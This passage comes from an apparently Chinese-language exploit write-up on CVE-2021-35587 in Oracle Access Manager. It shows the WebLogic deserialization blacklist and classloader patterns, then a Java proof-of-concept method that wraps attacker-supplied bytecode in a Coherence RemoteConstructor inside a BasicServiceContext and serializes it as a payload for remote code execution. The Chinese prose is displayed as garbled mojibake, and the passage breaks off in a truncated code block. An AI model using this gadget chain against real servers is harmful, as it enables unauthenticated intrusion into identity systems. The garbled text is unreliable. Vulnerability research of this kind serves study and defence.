</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-23>23</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aop</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aspectj</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aop</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aspectj</span><span style=color:#f92672>.</span><span style=color:#a6e22e>annotation</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aop</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aspectj</span><span style=color:#f92672>.</span><span style=color:#a6e22e>autoproxy</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>beans</span><span style=color:#f92672>.</span><span style=color:#a6e22e>factory</span><span style=color:#f92672>.</span><span style=color:#a6e22e>support</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transaction</span><span style=color:#f92672>.</span><span style=color:#a6e22e>support</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AbstractPlatformTransactionManager</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>sun</span><span style=color:#f92672>.</span><span style=color:#a6e22e>org</span><span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xalan</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xsltc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>trax</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>activation</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RemoteObject</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RemoteObjectInvocationHandler</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.</span><span style=color:#a6e22e>UnicastRemoteObject</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>javassist<span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>commons</span><span style=color:#f92672>.</span><span style=color:#a6e22e>collections</span><span style=color:#f92672>.</span><span style=color:#a6e22e>functors</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>codehaus</span><span style=color:#f92672>.</span><span style=color:#a6e22e>groovy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>runtime</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ConversionHandler</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>codehaus</span><span style=color:#f92672>.</span><span style=color:#a6e22e>groovy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>runtime</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ConvertedClosure</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>codehaus</span><span style=color:#f92672>.</span><span style=color:#a6e22e>groovy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>runtime</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MethodClosure</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>builder</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>proxy</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reader</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>spi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>metadata</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>spi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>model</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>python</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transaction</span><span style=color:#f92672>.</span><span style=color:#a6e22e>support</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AbstractPlatformTransactionManager</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.*</span>
</span></span></code></pre></td></tr></table></div></div><p>æ˜¾ç„¶ <code>com.tangosol.internal.util.invoke.RemoteConstructor</code> ä¸åœ¨å…¶ä¸­ã€‚</p><p>è€ŒOAMç¯å¢ƒä¸‹çš„ClassLoaderæ˜¯weblogic.utils.classloaders.GenericClassLoaderï¼Œå…¶ä¸­åŠ è½½äº†2314ä¸ªç±»</p><p><img loading=lazy src=image-20220714142331001.png alt=image-20220714142331001></p><p>å¹¶ä¸”å…¶ä¸­æœ‰ä¸€ä¸ªclassPatternsåˆ—è¡¨</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>0 = {Pattern@37540} &#34;^org.apache.commons.logging.{0,1}&#34;
</span></span><span style=display:flex><span>1 = {Pattern@37541} &#34;^oracle.security.am.{0,1}&#34;
</span></span><span style=display:flex><span>2 = {Pattern@37542} &#34;^com.tangosol.{0,1}&#34;
</span></span><span style=display:flex><span>3 = {Pattern@37543} &#34;^org.eclipse.higgins.configuration.{0,1}&#34;
</span></span><span style=display:flex><span>4 = {Pattern@37544} &#34;^org.python.{0,1}&#34;
</span></span></code></pre></td></tr></table></div></div><p>è¿™ä¸ªclassPatternsç”¨æ¥åˆ¤æ–­æ˜¯å¦å§”æ´¾ç»™åŒäº²</p><p><img loading=lazy src=image-20220714143622321.png alt=image-20220714143622321></p><p>ä½†classLoaderä¸­è¿˜æ˜¯æœ‰ä¸å°‘è¿™æ ·patternçš„ç±»çš„</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Iterator iterator<span style=color:#f92672>=</span>latestUserDefinedLoader<span style=color:#f92672>().</span><span style=color:#a6e22e>classes</span><span style=color:#f92672>.</span><span style=color:#a6e22e>iterator</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> res<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;();</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>    String item<span style=color:#f92672>=</span> iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class org.apache.commons.logging&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class oracle.security.am&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class com.tangosol&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class org.eclipse.higgins.configuration&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class org.python&#34;</span><span style=color:#f92672>)){</span>
</span></span><span style=display:flex><span>        res<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>res
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714150815941.png alt=image-20220714150815941></p><p>OAMä¸­æ²¡æœ‰è·å–åˆ°ç±»ï¼Œå¹¶ä¸”æŠ›å‡ºäº†å¼‚å¸¸</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-68-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-68-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ClassNotFoundException</span><span style=color:#f92672>:</span> com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RemoteConstructor</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714143749207.png alt=image-20220714143749207></p><p><code>class com.tangosol.internal.util.invoke.RemoteConstructor</code> ä¹Ÿç¡®å®ä¸åœ¨å…¶ä¸­</p><p><img loading=lazy src=image-20220714144924938.png alt=image-20220714144924938></p><h3 id=å»¶é•¿gadget>å»¶é•¿gadget<a hidden class=anchor aria-hidden=true href=#å»¶é•¿gadget>#</a></h3><p>å‚è€ƒç½‘ä¸Šèµ„æ–™å‘ç°ç±» <code>weblogic.rmi.provider.BasicServiceContext</code> æœ‰ä¸€ä¸ªå±æ€§æ˜¯objectç±»å‹</p><p><img loading=lazy src=image-20220714163101595.png alt=image-20220714163101595></p><p>å»¶é•¿åˆ©ç”¨é“¾åˆ°è¿™ä¸ªç±»å³å¯</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2021_35587</span><span style=color:#f92672>(</span>Class poccls<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>poccls<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ç§»æ¤gadgetæŠ¥é”™noclassdeffounderror>ç§»æ¤gadgetæŠ¥é”™ï¼šNoClassDefFoundError<a hidden class=anchor aria-hidden=true href=#ç§»æ¤gadgetæŠ¥é”™noclassdeffounderror>#</a></h3><h4 id=noclassdeffounderror>NoClassDefFoundError<a hidden class=anchor aria-hidden=true href=#noclassdeffounderror>#</a></h4><p>CVE-2020-14644æœ€åˆç‰ˆæœ¬çš„pocclså¦‚ä¸‹</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-70-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-70-12>12</a>
